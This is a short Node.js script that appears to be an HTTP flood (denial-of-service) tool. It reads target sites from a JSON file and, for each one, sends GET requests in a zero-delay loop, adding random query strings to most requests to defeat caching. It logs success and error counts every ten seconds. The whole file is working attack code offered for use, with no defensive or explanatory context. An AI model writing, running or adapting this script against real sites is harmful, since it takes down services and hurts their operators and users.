const request = require('request');
const targets = require('./sites.json');

let errors = 0;
let success = 0;

  function printStats() {
      console.log(`Log :: ${success} : ${errors}`);
    // let log = Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => target + ' : ' + number_of_requests + ' : ' + number_of_errored_responses + '\n').join('')
    // console.log(log);
}

  setInterval(printStats, 10000);
  
  async function fetchWithTimeout(resource) {
    
    return new Promise((resolve, reject) => {
        request
        .get(resource, {timeout: 1000})
        .on('response', function(response) {
            success++;
        })
        .on('error', function(err) {
            errors++;
        })
    })
    
  }
  
  async function flood(target) {
      let i = 0;
    setInterval(function(){
        rand = i++ % 3 === 0 ? '' : ('?' + Math.random() * 1000);
        fetchWithTimeout(target+rand);
    }, 0)       
  }
  
  // Start
  targets.map(flood);